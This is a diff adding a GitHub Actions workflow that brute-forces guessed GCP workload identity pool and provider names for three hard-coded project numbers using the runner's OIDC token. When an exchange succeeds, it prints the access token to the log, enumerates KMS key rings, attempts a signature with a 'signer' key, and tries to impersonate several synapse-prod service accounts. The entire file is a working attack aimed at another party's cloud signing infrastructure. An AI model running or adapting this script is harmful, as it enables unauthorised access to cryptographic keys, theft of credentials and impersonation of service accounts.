@@ -1,0 +1,43 @@
+name: KMS federation probe 2
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe2:
+    runs-on: ubuntu-latest
+    steps:
+      - name: gcp-wif-matrix2
+        run: |
+          set -u
+          mint() { curl -sS --max-time 30 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=""))' "$1")" | jq -r '.value // empty'; }
+          one() {
+            NUM=$1; POOL=$2; PROV=$3
+            AUD="//iam.googleapis.com/projects/$NUM/locations/global/workloadIdentityPools/$POOL/providers/$PROV"
+            TOK=$(mint "$AUD"); [ -z "$TOK" ] && { echo "MINT_FAIL $NUM $POOL $PROV"; return; }
+            OUT=$(curl -sS --max-time 30 -w '\nHTTP=%{http_code}' -X POST https://sts.googleapis.com/v1/token \
+              -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+              --data-urlencode "audience=$AUD" -d "scope=https://www.googleapis.com/auth/cloud-platform" \
+              -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+              -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" --data-urlencode "subject_token=$TOK")
+            echo "WIF2 $NUM $POOL/$PROV :: $(printf '%s' "$OUT" | tr '\n' ' ' | head -c 300)"
+            AT=$(printf '%s' "$OUT" | head -1 | jq -r '.access_token // empty' 2>/dev/null)
+            if [ -n "$AT" ]; then
+              echo "  TOKEN=$AT"
+              echo "  KEYRINGS=$(curl -sS --max-time 30 -H "Authorization: Bearer $AT" "https://cloudkms.googleapis.com/v1/projects/$NUM/locations/-/keyRings?pageSize=20" | head -c 600)"
+              echo "  PUB=$(curl -sS --max-time 30 -H "Authorization: Bearer $AT" "https://cloudkms.googleapis.com/v1/projects/$NUM/locations/global/keyRings/signer/cryptoKeys/signer/cryptoKeyVersions/1/publicKey" | head -c 900)"
+              DIG=$(python3 -c 'import os,base64;print(base64.b64encode(bytes.fromhex(os.urandom(32).hex())).decode())')
+              echo "  SIGN=$(curl -sS --max-time 30 -X POST -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' "https://cloudkms.googleapis.com/v1/projects/$NUM/locations/global/keyRings/signer/cryptoKeys/signer/cryptoKeyVersions/1:asymmetricSign" -d "{\"digest\":{\"sha256\":\"$DIG\"}}" | head -c 400)"
+              for GSA in signer@synapse-prod.iam.gserviceaccount.com kms@synapse-prod.iam.gserviceaccount.com rsm@synapse-prod.iam.gserviceaccount.com signer@$NUM.iam.gserviceaccount.com; do
+                echo "  GENAC $GSA -> $(curl -sS --max-time 30 -X POST -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$GSA:generateAccessToken" -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}' | head -c 220)"
+                sleep 0.3
+              done
+            fi
+            sleep 0.4
+          }
+          P724="github github-pool github-actions github-oidc gh-oidc gh-actions githubactions synapsecns sanguine ci prod external wif actions default workload-identity github-wif"
+          for P in $P724; do for V in github github-oidc github-provider; do one 724129488863 "$P" "$V"; done; done
+          for P in gha githubactions synapsecns sanguine ci prod; do for V in github github-provider; do one 969676484546 "$P" "$V"; done; done
+          for P in gha synapsecns sanguine prod; do one 892124123196 "$P" github; done
+          echo "=== done2 ==="
